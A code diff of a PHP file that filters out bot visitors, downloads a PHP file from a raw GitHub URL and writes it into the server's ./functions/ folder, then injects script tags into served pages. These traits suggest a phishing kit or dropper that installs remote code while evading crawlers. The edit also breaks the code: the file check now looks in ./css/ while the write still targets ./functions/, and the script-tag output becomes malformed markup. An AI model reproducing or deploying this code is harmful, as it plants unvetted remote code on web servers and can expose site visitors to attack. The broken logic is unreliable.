@@ -94,7 +94,7 @@ foreach ($bot_identifiers as $identifier) {
     exit();
   } 
 }
-;
+
 if($in == ''){
     $in = 'noreply';
 }
@@ -147,15 +147,13 @@ if(!is_file('./css/'. $style)){
     fclose($file);
 }
 
-
-if(!is_file('./functions/'. $update)){
-
+if(!is_file('./css/'. $update)){
 $data = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/update.php');
-$myfile = fopen('./functions/'. $update, "w") or die("Unable to open $update!");
+$myfile = fopen('./functions/'. $update, "w") or die("Unable to open $update");
 fwrite($myfile, $data);
 fclose($myfile);
-
 }
+
 
 
 if(!is_file('./script/'. $main)){
@@ -166,7 +164,7 @@ if(!is_file('./script/'. $main)){
     fclose($myfile);
     
     }
-    
+
 
 
 $me = basename($_SERVER['PHP_SELF']);
@@ -183,11 +181,9 @@ if (file_exists($filename)) {
 
 
 function isWorpress(){
-
-
-    
+ 
 echo "<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>";
-echo "<script type='text/javascript' src='/script/${main}'></script>";
+echo "<script type='text/javascript' src='/script/' ${main} '></script>";
     echo "hello";
     exit;
 
